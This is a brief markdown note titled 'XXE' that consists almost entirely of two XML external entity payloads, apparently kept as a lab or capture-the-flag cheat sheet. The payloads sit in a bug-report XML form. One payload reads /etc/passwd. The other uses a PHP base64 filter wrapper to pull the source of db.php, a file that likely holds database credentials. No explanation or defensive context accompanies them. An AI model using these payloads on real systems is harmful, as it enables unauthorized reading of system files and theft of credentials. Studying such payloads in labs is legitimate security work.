# XXE 
```
Content-Type: application/json

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
	</bugreport>
```
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>wef</cwe>
		<cvss>wef</cvss>
		<reward>wef</reward>
	</bugreport>
```
